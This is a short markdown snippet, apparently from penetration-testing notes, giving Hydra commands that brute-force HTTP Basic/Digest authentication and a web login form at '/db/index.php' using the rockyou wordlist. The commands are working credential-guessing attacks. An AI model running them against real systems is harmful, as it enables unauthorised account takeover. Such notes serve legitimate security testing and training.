<details>
<summary>$\huge{\text{Hydra}}$</summary>

- HTTP Basic Authentication & HTTP Digest Authentication
  - `hydra -L users.txt -P password.txt -vV example.com http-get /basic`
  - IMPORTANT NOTE: /basic and /basic/ are different... so pay attention to set the correct path
- Other: https://github.com/gnebbia/hydra_notes
- HTTP LOGIN
  - `hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"`

<br>
</details>
